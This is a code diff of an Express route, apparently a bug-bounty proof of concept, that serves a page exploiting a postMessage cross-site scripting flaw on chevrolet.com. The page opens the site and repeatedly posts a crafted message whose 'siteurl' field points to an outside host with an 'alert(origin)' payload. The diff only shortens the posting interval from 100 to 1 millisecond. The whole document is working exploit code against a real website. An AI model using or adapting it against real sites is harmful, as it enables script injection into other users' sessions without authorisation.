@@ -30,7 +30,7 @@ app.get("/chevroletXSS", function (req, res) {
    res.send(`<script>
    let tab = open("https://www.chevrolet.com");
    setInterval(()=>{
-   tab.postMessage(\`{"nonMP":"xsss","siteurl":"https://missoumsaid.com/test?input=alert(origin);////","lang":"xsss","country":"xsss","currency":"xsss","action":"xsss","value":"xsss","source":"xsss"}\`,"*")},100);
+   tab.postMessage(\`{"nonMP":"xsss","siteurl":"https://missoumsaid.com/test?input=alert(origin);////","lang":"xsss","country":"xsss","currency":"xsss","action":"xsss","value":"xsss","source":"xsss"}\`,"*")},1);
    </script>`);
 });
 
